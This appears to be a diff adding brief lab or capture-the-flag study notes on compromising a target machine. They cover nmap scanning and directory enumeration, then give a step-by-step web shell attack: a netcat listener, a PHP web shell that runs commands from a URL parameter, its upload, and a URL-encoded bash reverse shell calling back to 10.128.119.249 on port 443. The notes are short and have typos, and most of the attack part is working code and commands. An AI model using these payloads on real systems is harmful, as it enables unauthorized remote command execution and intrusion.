@@ -1,0 +1,15 @@
+To practically exploit a target machine, you can use tools like nmap for scanning open ports and identifying services. First, run a command like nmap -sS -p- MACHINE_IP to scan all ports on the target machine (replace MACHINE_IP with the actual IP address). This will show you which ports are open and what services are running on them. Once you identify a service, research potential vulnerabilities associated with that service to exploit it. You can also use tools like gobuster or dirb to enumerate directories and files, 
+looking for vulnerabilities such as command injection or file upload flaws. After discovering a vulnerability, you can use crafted payloads to gain unauthorized access, such as using a reverse shell or a web shell to execute commands remotely.
+
+Web shell
+1. nc -lvnp 443 to enale listener
+2. Create shell.php file with 
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+3. http://target_ip:8082 and upload shell.php file
+4. Go to http://target_ip/uploads/shell.php -> response www-data
+5. Run the payload http://target_ip:8082/uploads/shell.php?cmd=%3Bbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.128.119.249%2F443%200%3E%261%3B
+6. Once the listsner got connection, run command on the target machine
